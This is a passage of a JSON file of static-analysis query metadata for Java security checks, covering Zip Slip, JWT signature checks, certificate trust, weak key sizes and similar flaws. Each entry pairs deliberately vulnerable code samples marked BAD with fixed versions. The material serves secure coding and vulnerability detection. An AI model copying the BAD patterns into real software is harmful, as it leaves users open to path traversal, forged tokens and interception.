[CWE-209](https://cwe.mitre.org/data/definitions/209.html).\n"
  },
  "java/zipslip": {
    "name": "Arbitrary file access during archive extraction (\"Zip Slip\")",
    "description": "Extracting files from a malicious ZIP file, or similar type of archive, without validating that the destination file path is within the destination directory can allow an attacker to unexpectedly gain access to resources.",
    "kind": "path-problem",
    "id": "java/zipslip",
    "problem.severity": "error",
    "security-severity": 7.5,
    "precision": "high",
    "tags": [
      "security",
      "external/cwe/cwe-022"
    ],
    "filename": "6f72eba0-ZipSlip",
    "language": "java",
    "help": "# Arbitrary file access during archive extraction (\"Zip Slip\")\nExtracting files from a malicious zip file, or similar type of archive, is at risk of directory traversal attacks if filenames from the archive are not properly validated.\n\nZip archives contain archive entries representing each file in the archive. These entries include a file path for the entry, but these file paths are not restricted and may contain unexpected special elements such as the directory traversal element (`..`). If these file paths are used to create a filesystem path, then a file operation may happen in an unexpected location. This can result in sensitive information being revealed or deleted, or an attacker being able to influence behavior by modifying unexpected files.\n\nFor example, if a zip file contains a file entry `..\\sneaky-file`, and the zip file is extracted to the directory `c:\\output`, then naively combining the paths would result in an output file path of `c:\\output\\..\\sneaky-file`, which would cause the file to be written to `c:\\sneaky-file`.\n\n\n## Recommendation\nEnsure that output paths constructed from zip archive entries are validated to prevent writing files to unexpected locations.\n\nThe recommended way of writing an output file from a zip archive entry is to verify that the normalized full path of the output file starts with a prefix that matches the destination directory. Path normalization can be done with either `java.io.File.getCanonicalFile()` or `java.nio.file.Path.normalize()`. Prefix checking can be done with `String.startsWith(..)`, but it is better to use `java.nio.file.Path.startsWith(..)`, as the latter works on complete path segments.\n\nAnother alternative is to validate archive entries against a whitelist of expected files.\n\n\n## Example\nIn this example, a file path taken from a zip archive item entry is combined with a destination directory. The result is used as the destination file path without verifying that the result is within the destination directory. If provided with a zip file containing an archive path like `..\\sneaky-file`, then this file would be written outside the destination directory.\n\n\n```java\nvoid writeZipEntry(ZipEntry entry, File destinationDir) {\n    File file = new File(destinationDir, entry.getName());\n    FileOutputStream fos = new FileOutputStream(file); // BAD\n    // ... write entry to fos ...\n}\n\n```\nTo fix this vulnerability, we need to verify that the normalized `file` still has `destinationDir` as its prefix, and throw an exception if this is not the case.\n\n\n```java\nvoid writeZipEntry(ZipEntry entry, File destinationDir) {\n    File file = new File(destinationDir, entry.getName());\n    if (!file.toPath().normalize().startsWith(destinationDir.toPath()))\n        throw new Exception(\"Bad zip entry\");\n    FileOutputStream fos = new FileOutputStream(file); // OK\n    // ... write entry to fos ...\n}\n\n```\n\n## References\n* Snyk: [Zip Slip Vulnerability](https://snyk.io/research/zip-slip-vulnerability).\n* OWASP: [Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal).\n* Common Weakness Enumeration: [CWE-22](https://cwe.mitre.org/data/definitions/22.html).\n"
  },
  "java/disabled-certificate-revocation-checking": {
    "name": "Disabled certificate revocation checking",
    "description": "Using revoked certificates is dangerous. Therefore, revocation status of certificates in a chain should be checked.",
    "kind": "path-problem",
    "problem.severity": "error",
    "precision": "high",
    "id": "java/disabled-certificate-revocation-checking",
    "tags": [
      "security",
      "experimental",
      "external/cwe/cwe-299"
    ],
    "filename": "ac617fba-DisabledRevocationChecking",
    "language": "java",
    "help": "# Disabled certificate revocation checking\nValidating a certificate chain includes multiple steps. One of them is checking whether or not certificates in the chain have been revoked. A certificate may be revoked due to multiple reasons. One of the reasons why the certificate authority (CA) may revoke a certificate is that its private key has been compromised. For example, the private key might have been stolen by an adversary. In this case, the adversary may be able to impersonate the owner of the private key. Therefore, trusting a revoked certificate may be dangerous.\n\nThe Java Certification Path API provides a revocation checking mechanism that supports both CRL and OCSP. Revocation checking happens while building and validating certificate chains. If at least one of the certificates is revoked, then an exception is thrown. This mechanism is enabled by default. However, it may be disabled by passing `false` to the `PKIXParameters.setRevocationEnabled()` method. If an application doesn't set a custom `PKIXRevocationChecker` via `PKIXParameters.addCertPathChecker()` or `PKIXParameters.setCertPathCheckers()` methods, then revocation checking is not going to happen.\n\n\n## Recommendation\nAn application should not disable the default revocation checking mechanism unless it provides a custom revocation checker.\n\n\n## Example\nThe following example turns off revocation checking for validating a certificate chain. That should be avoided.\n\n\n```java\npublic void validateUnsafe(KeyStore cacerts, CertPath chain) throws Exception {\n    CertPathValidator validator = CertPathValidator.getInstance(\"PKIX\");\n    PKIXParameters params = new PKIXParameters(cacerts);\n    params.setRevocationEnabled(false);\n    validator.validate(chain, params);\n}\n```\nThe next example uses the default revocation checking mechanism.\n\n\n```java\npublic void validate(KeyStore cacerts, CertPath chain) throws Exception {\n    CertPathValidator validator = CertPathValidator.getInstance(\"PKIX\");\n    PKIXParameters params = new PKIXParameters(cacerts);\n    validator.validate(chain, params);\n}\n```\nThe third example turns off the default revocation mechanism. However, it registers another revocation checker that uses OCSP to obtain revocation status of certificates.\n\n\n```java\npublic void validate(KeyStore cacerts, CertPath certPath) throws Exception {\n    CertPathValidator validator = CertPathValidator.getInstance(\"PKIX\");\n    PKIXParameters params = new PKIXParameters(cacerts);\n    params.setRevocationEnabled(false);\n    PKIXRevocationChecker checker = (PKIXRevocationChecker) validator.getRevocationChecker();\n    checker.setOcspResponder(OCSP_RESPONDER_URL);\n    checker.setOcspResponderCert(OCSP_RESPONDER_CERT);\n    params.addCertPathChecker(checker);\n    validator.validate(certPath, params);\n}\n```\n\n## References\n* Wikipedia: [Public key certificate](https://en.wikipedia.org/wiki/Public_key_certificate)\n* Java SE Documentation: [Java PKI Programmer's Guide](https://docs.oracle.com/javase/8/docs/technotes/guides/security/certpath/CertPathProgGuide.html)\n* Java API Specification: [CertPathValidator](https://docs.oracle.com/en/java/javase/11/docs/api/java.base/java/security/cert/CertPathValidator.html)\n* Common Weakness Enumeration: [CWE-299](https://cwe.mitre.org/data/definitions/299.html).\n"
  },
  "java/unvalidated-url-forward": {
    "name": "URL forward from a remote source",
    "description": "URL forward based on unvalidated user input may cause file information disclosure.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 7.5,
    "precision": "high",
    "id": "java/unvalidated-url-forward",
    "tags": [
      "security",
      "external/cwe/cwe-552"
    ],
    "filename": "70601717-UrlForward",
    "language": "java",
    "help": "# URL forward from a remote source\nDirectly incorporating user input into a URL forward request without validating the input can cause file information disclosure by allowing an attacker to access unauthorized URLs.\n\n\n## Recommendation\nTo guard against untrusted URL forwarding, you should avoid putting user input directly into a forwarded URL. Instead, you should maintain a list of authorized URLs on the server, then choose from that list based on the user input provided.\n\n\n## Example\nThe following example shows an HTTP request parameter being used directly in a URL forward without validating the input, which may cause file information disclosure. It also shows how to remedy the problem by validating the user input against a known fixed string.\n\n\n```java\npublic class UrlForward extends HttpServlet {\n\tprivate static final String VALID_FORWARD = \"https://cwe.mitre.org/data/definitions/552.html\";\n\n\tprotected void doGet(HttpServletRequest request, HttpServletResponse response)\n\t\t\tthrows ServletException, IOException {\n\t\tServletConfig cfg = getServletConfig();\n\t\tServletContext sc = cfg.getServletContext();\n\n\t\t// BAD: a request parameter is incorporated without validation into a URL forward\n\t\tsc.getRequestDispatcher(request.getParameter(\"target\")).forward(request, response);\n\n\t\t// GOOD: the request parameter is validated against a known fixed string\n\t\tif (VALID_FORWARD.equals(request.getParameter(\"target\"))) {\n\t\t\tsc.getRequestDispatcher(VALID_FORWARD).forward(request, response);\n\t\t}\n\t}\n}\n\n```\n\n## References\n* OWASP: [Unvalidated Redirects and Forwards Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html).\n* Common Weakness Enumeration: [CWE-552](https://cwe.mitre.org/data/definitions/552.html).\n"
  },
  "java/ip-address-spoofing": {
    "name": "IP address spoofing",
    "description": "A remote endpoint identifier is read from an HTTP header. Attackers can modify the value of the identifier to forge the client ip.",
    "kind": "path-problem",
    "problem.severity": "error",
    "precision": "high",
    "id": "java/ip-address-spoofing",
    "tags": [
      "security",
      "experimental",
      "external/cwe/cwe-348"
    ],
    "filename": "ba68d51c-ClientSuppliedIpUsedInSecurityCheck",
    "language": "java",
    "help": "# IP address spoofing\nAn original client IP address is retrieved from an http header (`X-Forwarded-For` or `X-Real-IP` or `Proxy-Client-IP` etc.), which is used to ensure security. Attackers can forge the value of these identifiers to bypass a ban-list, for example.\n\n\n## Recommendation\nDo not trust the values of HTTP headers allegedly identifying the originating IP. If you are aware your application will run behind some reverse proxies then the last entry of a `X-Forwarded-For` header value may be more trustworthy than the rest of it because some reverse proxies append the IP address they observed to the end of any remote-supplied header.\n\n\n## Example\nThe following examples show the bad case and the good case respectively. In `bad1` method and `bad2` method, the client ip the `X-Forwarded-For` is split into comma-separated values, but the less-trustworthy first one is used. Both of these examples could be deceived by providing a forged HTTP header. The method `good1` similarly splits an `X-Forwarded-For` value, but uses the last, more-trustworthy entry.\n\n\n```java\nimport javax.servlet.http.HttpServletRequest;\nimport org.apache.commons.lang3.StringUtils;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.stereotype.Controller;\nimport org.springframework.web.bind.annotation.GetMapping;\nimport org.springframework.web.bind.annotation.ResponseBody;\n\n@Controller\npublic class ClientSuppliedIpUsedInSecurityCheck {\n\n    @Autowired\n    private HttpServletRequest request;\n\n    @GetMapping(value = \"bad1\")\n    public void bad1(HttpServletRequest request) {\n        String ip = getClientIP();\n        if (!StringUtils.startsWith(ip, \"192.168.\")) {\n            new Exception(\"ip illegal\");\n        }\n    }\n\n    @GetMapping(value = \"bad2\")\n    public void bad2(HttpServletRequest request) {\n        String ip = getClientIP();\n        if (!\"127.0.0.1\".equals(ip)) {\n            new Exception(\"ip illegal\");\n        }\n    }\n\n    @GetMapping(value = \"good1\")\n    @ResponseBody\n    public String good1(HttpServletRequest request) {\n        String ip = request.getHeader(\"X-FORWARDED-FOR\");\n        // Good: if this application runs behind a reverse proxy it may append the real remote IP to the end of any client-supplied X-Forwarded-For header.\n        ip = ip.split(\",\")[ip.split(\",\").length - 1];\n        if (!StringUtils.startsWith(ip, \"192.168.\")) {\n            new Exception(\"ip illegal\");\n        }\n        return ip;\n    }\n\n    protected String getClientIP() {\n        String xfHeader = request.getHeader(\"X-Forwarded-For\");\n        if (xfHeader == null) {\n            return request.getRemoteAddr();\n        }\n        return xfHeader.split(\",\")[0];\n    }\n}\n\n```\n\n## References\n* Dennis Schneider: [ Prevent IP address spoofing with X-Forwarded-For header when using AWS ELB and Clojure Ring](https://www.dennis-schneider.com/blog/prevent-ip-address-spoofing-with-x-forwarded-for-header-and-aws-elb-in-clojure-ring/)\n* Security Rule Zero: [A Warning about X-Forwarded-For](https://www.f5.com/company/blog/security-rule-zero-a-warning-about-x-forwarded-for)\n* Common Weakness Enumeration: [CWE-348](https://cwe.mitre.org/data/definitions/348.html).\n"
  },
  "java/missing-jwt-signature-check": {
    "name": "Missing JWT signature check",
    "description": "Failing to check the Json Web Token (JWT) signature may allow an attacker to forge their own tokens.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 7.8,
    "precision": "high",
    "id": "java/missing-jwt-signature-check",
    "tags": [
      "security",
      "external/cwe/cwe-347"
    ],
    "filename": "604686a4-MissingJWTSignatureCheck",
    "language": "java",
    "help": "# Missing JWT signature check\nA JSON Web Token (JWT) consists of three parts: header, payload, and signature. The `io.jsonwebtoken.jjwt` library is one of many libraries used for working with JWTs. It offers different methods for parsing tokens like `parse`, `parseClaimsJws`, and `parsePlaintextJws`. The last two correctly verify that the JWT is properly signed. This is done by computing the signature of the combination of header and payload and comparing the locally computed signature with the signature part of the JWT.\n\nTherefore it is necessary to provide the `JwtParser` with a key that is used for signature validation. Unfortunately the `parse` method **accepts** a JWT whose signature is empty although a signing key has been set for the parser. This means that an attacker can create arbitrary JWTs that will be accepted if this method is used.\n\n\n## Recommendation\nAlways verify the signature by using either the `parseClaimsJws` and `parsePlaintextJws` methods or by overriding the `onPlaintextJws` or `onClaimsJws` of `JwtHandlerAdapter`.\n\n\n## Example\nThe following example shows four cases where a signing key is set for a parser. In the first 'BAD' case the `parse` method is used, which will not validate the signature. The second 'BAD' case uses a `JwtHandlerAdapter` where the `onPlaintextJwt` method is overriden, so it will not validate the signature. The third and fourth 'GOOD' cases use `parseClaimsJws` method or override the `onPlaintextJws` method.\n\n\n```java\npublic void badJwt(String token) {\n    Jwts.parserBuilder()\n                .setSigningKey(\"someBase64EncodedKey\").build()\n                .parse(token); // BAD: Does not verify the signature\n}\n\npublic void badJwtHandler(String token) {\n    Jwts.parserBuilder()\n                .setSigningKey(\"someBase64EncodedKey\").build()\n                .parse(plaintextJwt, new JwtHandlerAdapter<Jwt<Header, String>>() {\n                    @Override\n                    public Jwt<Header, String> onPlaintextJwt(Jwt<Header, String> jwt) {\n                        return jwt;\n                    }\n                }); // BAD: The handler is called on an unverified JWT\n}\n\npublic void goodJwt(String token) {\n    Jwts.parserBuilder()\n                .setSigningKey(\"someBase64EncodedKey\").build()\n                .parseClaimsJws(token) // GOOD: Verify the signature\n                .getBody();\n}\n\npublic void goodJwtHandler(String token) {\n    Jwts.parserBuilder()\n                .setSigningKey(\"someBase64EncodedKey\").build()\n                .parse(plaintextJwt, new JwtHandlerAdapter<Jws<String>>() {\n                    @Override\n                    public Jws<String> onPlaintextJws(Jws<String> jws) {\n                        return jws;\n                    }\n                }); // GOOD: The handler is called on a verified JWS\n}\n```\n\n## References\n* zofrex: [How I Found An alg=none JWT Vulnerability in the NHS Contact Tracing App](https://www.zofrex.com/blog/2020/10/20/alg-none-jwt-nhs-contact-tracing-app/).\n* Common Weakness Enumeration: [CWE-347](https://cwe.mitre.org/data/definitions/347.html).\n"
  },
  "java/android/sensitive-keyboard-cache": {
    "name": "Android sensitive keyboard cache",
    "description": "Allowing the keyboard to cache sensitive information may result in information leaks to other applications.",
    "kind": "problem",
    "problem.severity": "warning",
    "security-severity": 8.1,
    "id": "java/android/sensitive-keyboard-cache",
    "tags": [
      "security",
      "external/cwe/cwe-524"
    ],
    "precision": "medium",
    "filename": "05322413-SensitiveKeyboardCache",
    "language": "java",
    "help": "# Android sensitive keyboard cache\nWhen a user enters information in a text input field on an Android application, their input is saved to a keyboard cache which provides autocomplete suggestions and predictions. There is a risk that sensitive user data, such as passwords or banking information, may be leaked to other applications via the keyboard cache.\n\n\n## Recommendation\nFor input fields expected to accept sensitive information, use input types such as `\"textNoSuggestions\"` (or `\"textPassword\"` for a password) to ensure the input does not get stored in the keyboard cache.\n\nOptionally, instead of declaring an input type through XML, you can set the input type in your code using `TextView.setInputType()`.\n\n\n## Example\nIn the following example, the field labeled BAD allows the password to be saved to the keyboard cache, whereas the field labeled GOOD uses the `\"textPassword\"` input type to ensure the password is not cached.\n\n\n```xml\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<LinearLayout\n    xmlns:android=\"http://schemas.android.com/apk/res/android\"\n    xmlns:app=\"http://schemas.android.com/apk/res-auto\">\n\n    <!-- BAD: This password field uses the `text` input type, which allows the input to be saved to the keyboard cache. -->\n    <EditText\n        android:id=\"@+id/password_bad\"\n        android:inputType=\"text\"/> \n\n    <!-- GOOD: This password field uses the `textPassword` input type, which ensures that the input is not saved to the keyboard cache. -->\n    <EditText\n        android:id=\"@+id/password_good\"\n        android:inputType=\"textPassword\"/>  \n</LinearLayout>\n```\n\n## References\n* OWASP Mobile Application Security Testing Guide: [Determining Whether the Keyboard Cache Is Disabled for Text Input Fields](https://github.com/OWASP/owasp-mastg/blob/b7a93a2e5e0557cc9a12e55fc3f6675f6986bb86/Document/0x05d-Testing-Data-Storage.md#determining-whether-the-keyboard-cache-is-disabled-for-text-input-fields-mstg-storage-5).\n* Android Developers: [android:inputType attribute documentation.](https://developer.android.com/reference/android/widget/TextView#attr_android:inputType)\n* Common Weakness Enumeration: [CWE-524](https://cwe.mitre.org/data/definitions/524.html).\n"
  },
  "java/unsafe-cert-trust": {
    "name": "Unsafe certificate trust",
    "description": "SSLSocket/SSLEngine ignores all SSL certificate validation errors when establishing an HTTPS connection, thereby making the app vulnerable to man-in-the-middle attacks.",
    "kind": "problem",
    "problem.severity": "warning",
    "security-severity": 9.8,
    "precision": "medium",
    "id": "java/unsafe-cert-trust",
    "tags": [
      "security",
      "external/cwe/cwe-273"
    ],
    "filename": "7cb93d00-UnsafeCertTrust",
    "language": "java",
    "help": "# Unsafe certificate trust\nJava offers two mechanisms for SSL authentication - trust manager and hostname verifier (the later is checked by the `java/insecure-hostname-verifier` query). The trust manager validates the peer's certificate chain while hostname verification establishes that the hostname in the URL matches the hostname in the server's identification.\n\nWhen `SSLSocket` or `SSLEngine` are created without a secure `setEndpointIdentificationAlgorithm`, hostname verification is disabled by default.\n\nThis query checks whether `setEndpointIdentificationAlgorithm` is missing, thereby making the application vulnerable to man-in-the-middle attacks. The query also covers insecure configurations of `com.rabbitmq.client.ConnectionFactory`.\n\n\n## Recommendation\nValidate SSL certificates in SSL authentication.\n\n\n## Example\nThe following two examples show two ways of configuring SSLSocket/SSLEngine. In the 'BAD' case, `setEndpointIdentificationAlgorithm` is not called, thus no hostname verification takes place. In the 'GOOD' case, `setEndpointIdentificationAlgorithm` is called.\n\n\n```java\npublic static void main(String[] args) {\n\n\t{\n\t\tSSLContext sslContext = SSLContext.getInstance(\"TLS\");\n\t\tSSLEngine sslEngine = sslContext.createSSLEngine();\n\t\tSSLParameters sslParameters = sslEngine.getSSLParameters();\n\t\tsslParameters.setEndpointIdentificationAlgorithm(\"HTTPS\"); //GOOD: Set a valid endpointIdentificationAlgorithm for SSL engine to trigger hostname verification\n\t\tsslEngine.setSSLParameters(sslParameters);\n\t}\n\n\t{\n\t\tSSLContext sslContext = SSLContext.getInstance(\"TLS\");\n\t\tSSLEngine sslEngine = sslContext.createSSLEngine();  //BAD: No endpointIdentificationAlgorithm set\n\t}\n\n\t{\n\t\tSSLContext sslContext = SSLContext.getInstance(\"TLS\");\n\t\tfinal SSLSocketFactory socketFactory = sslContext.getSocketFactory();\n\t\tSSLSocket socket = (SSLSocket) socketFactory.createSocket(\"www.example.com\", 443); \n\t\tSSLParameters sslParameters = sslEngine.getSSLParameters();\n\t\tsslParameters.setEndpointIdentificationAlgorithm(\"HTTPS\"); //GOOD: Set a valid endpointIdentificationAlgorithm for SSL socket to trigger hostname verification\n\t\tsocket.setSSLParameters(sslParameters);\n\t}\n\n\t{\n\t\tcom.rabbitmq.client.ConnectionFactory connectionFactory = new com.rabbitmq.client.ConnectionFactory();\n\t\tconnectionFactory.useSslProtocol();\n\t\tconnectionFactory.enableHostnameVerification();  //GOOD: Enable hostname verification for rabbitmq ConnectionFactory\n\t}\n\n\t{\n\t\tcom.rabbitmq.client.ConnectionFactory connectionFactory = new com.rabbitmq.client.ConnectionFactory();\n\t\tconnectionFactory.useSslProtocol(); //BAD: Hostname verification for rabbitmq ConnectionFactory is not enabled\n\t}\n}\n```\n\n## References\n* [Testing Endpoint Identify Verification (MSTG-NETWORK-3)](https://github.com/OWASP/owasp-mstg/blob/master/Document/0x05g-Testing-Network-Communication.md).\n* [SSLParameters.setEndpointIdentificationAlgorithm documentation](https://docs.oracle.com/en/java/javase/11/docs/api/java.base/javax/net/ssl/SSLParameters.html#setEndpointIdentificationAlgorithm(java.lang.String)).\n* RabbitMQ: [ConnectionFactory.enableHostnameVerification documentation](https://rabbitmq.github.io/rabbitmq-java-client/api/current/com/rabbitmq/client/ConnectionFactory.html#enableHostnameVerification()).\n* RabbitMQ: [Using TLS in the Java Client](https://www.rabbitmq.com/ssl.html#java-client).\n* [CVE-2018-17187: Apache Qpid Proton-J transport issue with hostname verification](https://github.com/advisories/GHSA-xvch-r4wf-h8w9).\n* [CVE-2018-8034: Apache Tomcat - host name verification when using TLS with the WebSocket client](https://github.com/advisories/GHSA-46j3-r4pj-4835).\n* [CVE-2018-11087: Pivotal Spring AMQP vulnerability due to lack of hostname validation](https://github.com/advisories/GHSA-w4g2-9hj6-5472).\n* [CVE-2018-11775: TLS hostname verification issue when using the Apache ActiveMQ Client](https://github.com/advisories/GHSA-m9w8-v359-9ffr).\n* Common Weakness Enumeration: [CWE-273](https://cwe.mitre.org/data/definitions/273.html).\n"
  },
  "java/insufficient-key-size": {
    "name": "Use of a cryptographic algorithm with insufficient key size",
    "description": "Using cryptographic algorithms with too small a key size can allow an attacker to compromise security.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "security-severity": 7.5,
    "precision": "high",
    "id": "java/insufficient-key-size",
    "tags": [
      "security",
      "external/cwe/cwe-326"
    ],
    "filename": "17f00cee-InsufficientKeySize",
    "language": "java",
    "help": "# Use of a cryptographic algorithm with insufficient key size\nModern encryption relies on the computational infeasibility of breaking a cipher and decoding its message without the key. As computational power increases, the ability to break ciphers grows, and key sizes need to become larger as a result. Cryptographic algorithms that use too small of a key size are vulnerable to brute force attacks, which can reveal sensitive data.\n\n\n## Recommendation\nUse a key of the recommended size or larger. The key size should be at least 128 bits for AES encryption, 256 bits for elliptic-curve cryptography (ECC), and 2048 bits for RSA, DSA, or DH encryption.\n\n\n## Example\nThe following code uses cryptographic algorithms with insufficient key sizes.\n\n\n```java\n    KeyPairGenerator keyPairGen1 = KeyPairGenerator.getInstance(\"RSA\");\n    keyPairGen1.initialize(1024); // BAD: Key size is less than 2048\n\n    KeyPairGenerator keyPairGen2 = KeyPairGenerator.getInstance(\"DSA\");\n    keyPairGen2.initialize(1024); // BAD: Key size is less than 2048\n\n    KeyPairGenerator keyPairGen3 = KeyPairGenerator.getInstance(\"DH\");\n    keyPairGen3.initialize(1024); // BAD: Key size is less than 2048\n\n    KeyPairGenerator keyPairGen4 = KeyPairGenerator.getInstance(\"EC\");\n    ECGenParameterSpec ecSpec = new ECGenParameterSpec(\"secp112r1\"); // BAD: Key size is less than 256\n    keyPairGen4.initialize(ecSpec);\n\n    KeyGenerator keyGen = KeyGenerator.getInstance(\"AES\");\n    keyGen.init(64); // BAD: Key size is less than 128\n\n```\nTo fix the code, change the key sizes to be the recommended size or larger for each algorithm.\n\n\n## References\n* Wikipedia: [Key size](http://en.wikipedia.org/wiki/Key_size).\n* Wikipedia: [Strong cryptography](https://en.wikipedia.org/wiki/Strong_cryptography).\n* OWASP: [ Cryptographic Storage Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html#algorithms).\n* OWASP: [ Testing for Weak Encryption](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/04-Testing_for_Weak_Encryption).\n* NIST: [ Transitioning the Use of Cryptographic Algorithms and Key Lengths](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-131Ar2.pdf).\n* Common Weakness Enumeration: [CWE-326](https://cwe.mitre.org/data/definitions/326.html).\n"
  },
  "java/android/insecure-local-key-gen": {
    "name": "Insecurely generated keys for local authentication",
    "description": "Generation of keys with insecure parameters for local biometric authentication can allow attackers with physical access to bypass authentication checks.",
    "kind": "problem",
    "problem.severity": "warning",
    "security-severity": 4.4,
    "precision": "medium",
    "id": "java/android/insecure-local-key-gen",
    "tags": [
      "security",
      "external/cwe/cwe-287"
    ],
    "filename": "bcacc89f-AndroidInsecureKeys",
    "language": "java",
    "help": "# Insecurely generated keys for local authentication\nBiometric authentication, such as fingerprint recognition, can be used alongside cryptographic keys stored in the Android `KeyStore` to protect sensitive parts of the application. However, when a key generated for this purpose has certain parameters set insecurely, an attacker with physical access can bypass the authentication check using application hooking tools such as Frida.\n\n\n## Recommendation\nWhen generating a key for use with biometric authentication, ensure that the following parameters of `KeyGenParameterSpec.Builder` are set:\n\n* `setUserAuthenticationRequired` should be set to `true`; otherwise, the key can be used without user authentication.\n* `setInvalidatedByBiometricEnrollment` should be set to `true` (the default); otherwise, an attacker can use the key by enrolling additional biometrics on the device.\n* `setUserAuthenticationValidityDurationSeconds`, if used, should be set to `-1`; otherwise, non-biometric (less secure) credentials can be used to access the key. We recommend using `setUserAuthenticationParameters` instead to explicitly set both the timeout and the types of credentials that may be used.\n\n## Example\nThe following example demonstrates a key that is configured with secure paramaters:\n\n\n```java\nprivate void generateSecretKey() {\n    KeyGenParameterSpec keyGenParameterSpec = new KeyGenParameterSpec.Builder(\n        \"MySecretKey\",\n        KeyProperties.PURPOSE_ENCRYPT | KeyProperties.PURPOSE_DECRYPT)\n        .setBlockModes(KeyProperties.BLOCK_MODE_CBC)\n        .setEncryptionPaddings(KeyProperties.ENCRYPTION_PADDING_PKCS7)\n        // GOOD: Secure parameters are used to generate a key for biometric authentication.\n        .setUserAuthenticationRequired(true)\n        .setInvalidatedByBiometricEnrollment(true)\n        .setUserAuthenticationParameters(0, KeyProperties.AUTH_BIOMETRIC_STRONG)\n        .build();\n    KeyGenerator keyGenerator = KeyGenerator.getInstance(\n            KeyProperties.KEY_ALGORITHM_AES, \"AndroidKeyStore\");\n    keyGenerator.init(keyGenParameterSpec);\n    keyGenerator.generateKey();\n}\n```\nIn each of the following cases, a parameter is set insecurely:\n\n\n```java\nprivate void generateSecretKey() {\n    KeyGenParameterSpec keyGenParameterSpec = new KeyGenParameterSpec.Builder(\n        \"MySecretKey\",\n        KeyProperties.PURPOSE_ENCRYPT | KeyProperties.PURPOSE_DECRYPT)\n        .setBlockModes(KeyProperties.BLOCK_MODE_CBC)\n        .setEncryptionPaddings(KeyProperties.ENCRYPTION_PADDING_PKCS7)\n        // BAD: User authentication is not required to use this key.\n        .setUserAuthenticationRequired(false)\n        .build();\n    KeyGenerator keyGenerator = KeyGenerator.getInstance(\n            KeyProperties.KEY_ALGORITHM_AES, \"AndroidKeyStore\");\n    keyGenerator.init(keyGenParameterSpec);\n    keyGenerator.generateKey();\n}\n\nprivate void generateSecretKey() {\n    KeyGenParameterSpec keyGenParameterSpec = new KeyGenParameterSpec.Builder(\n        \"MySecretKey\",\n        KeyProperties.PURPOSE_ENCRYPT | KeyProperties.PURPOSE_DECRYPT)\n        .setBlockModes(KeyProperties.BLOCK_MODE_CBC)\n        .setEncryptionPaddings(KeyProperties.ENCRYPTION_PADDING_PKCS7)\n        .setUserAuthenticationRequired(true)\n        // BAD: An attacker can access this key by enrolling additional biometrics.\n        .setInvalidatedByBiometricEnrollment(false)\n        .build();\n    KeyGenerator keyGenerator = KeyGenerator.getInstance(\n            KeyProperties.KEY_ALGORITHM_AES, \"AndroidKeyStore\");\n    keyGenerator.init(keyGenParameterSpec);\n    keyGenerator.generateKey();\n}\n\nprivate void generateSecretKey() {\n    KeyGenParameterSpec keyGenParameterSpec = new KeyGenParameterSpec.Builder(\n        \"MySecretKey\",\n        KeyProperties.PURPOSE_ENCRYPT | KeyProperties.PURPOSE_DECRYPT)\n        .setBlockModes(KeyProperties.BLOCK_MODE_CBC)\n        .setEncryptionPaddings(KeyProperties.ENCRYPTION_PADDING_PKCS7)\n        .setUserAuthenticationRequired(true)\n        .setInvalidatedByBiometricEnrollment(true)\n        // BAD: This key can be accessed using non-biometric credentials. \n        .setUserAuthenticationValidityDurationSeconds(30)\n        .build();\n    KeyGenerator keyGenerator = KeyGenerator.getInstance(\n            KeyProperties.KEY_ALGORITHM_AES, \"AndroidKeyStore\");\n    keyGenerator.init(keyGenParameterSpec);\n    keyGenerator.generateKey();\n}\n```\n\n## References\n* WithSecure: [How Secure is your Android Keystore Authentication?](https://labs.withsecure.com/publications/how-secure-is-your-android-keystore-authentication).\n* Android Developers: [KeyGenParameterSpec.Builder](https://developer.android.com/reference/android/security/keystore/KeyGenParameterSpec.Builder).\n* Common Weakness Enumeration: [CWE-287](https://cwe.mitre.org/data/definitions/287.html).\n"
  },
  "java/tomcat-disabled-httponly": {
    "name": "Tomcat config disables 'HttpOnly' flag (XSS risk)",
    "description": "Disabling 'HttpOnly' leaves session cookies vulnerable to an XSS attack.",
    "kind": "problem",
    "problem.severity": "warning",
    "precision": "medium",
    "id": "java/tomcat-disabled-httponly",
    "tags": [
      "security",
      "experimental",
      "external/cwe/cwe-1004"
    ],
    "filename": "351c0644-InsecureTomcatConfig",
    "language": "java",
    "help": "# Tomcat config disables 'HttpOnly' flag (XSS risk)\nWhen you add an application to a Tomcat server, it will generate a new `JSESSIONID` when you call `request.getSession()` or if you invoke a JSP from a servlet. If cookies are generated without the `HttpOnly` flag, an attacker can use a cross-site scripting (XSS) attack to get another user's session ID.\n\n\n## Recommendation\nTomcat version 7+ automatically sets an `HttpOnly` flag on all session cookies to prevent client side scripts from accessing the session ID. In most situations, you should not override this behavior.\n\n\n## Example\nThe following example shows a Tomcat configuration with `useHttpOnly` disabled. Usually you should not set this.\n\n\n```xml\n<web-app xmlns=\"http://java.sun.com/xml/ns/javaee\" \n    xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://java.sun.com/xml/ns/javaee\n          http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd\" version=\"2.5\">\n    <display-name>Sample Tomcat Web Application</display-name>\n    <context-param>\n        <param-name>useHttpOnly</param-name>\n        <param-value>false</param-value>\n    </context-param>\n</web-app>\n```\n\n## References\n* CWE: [Sensitive Cookie Without 'HttpOnly' Flag](https://cwe.mitre.org/data/definitions/1004.html).\n* OWASP: [ HttpOnly ](https://www.owasp.org/index.php/HttpOnly).\n* Common Weakness Enumeration: [CWE-1004](https://cwe.mitre.org/data/definitions/1004.html).\n"
  },
  "java/insecure-ldap-auth": {
    "name": "Insecure LDAP authentication",
    "description": "LDAP authentication with credentials sent in cleartext makes sensitive information vulnerable to remote attackers",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 8.8,
    "precision": "high",
    "id": "java/insecure-ldap-auth",
    "tags": [
      "security",
      "external/cwe/cwe-522",
      "external/cwe/cwe-319"
    ],
    "filename": "f1f90a80-InsecureLdapAuth",
    "language": "java",
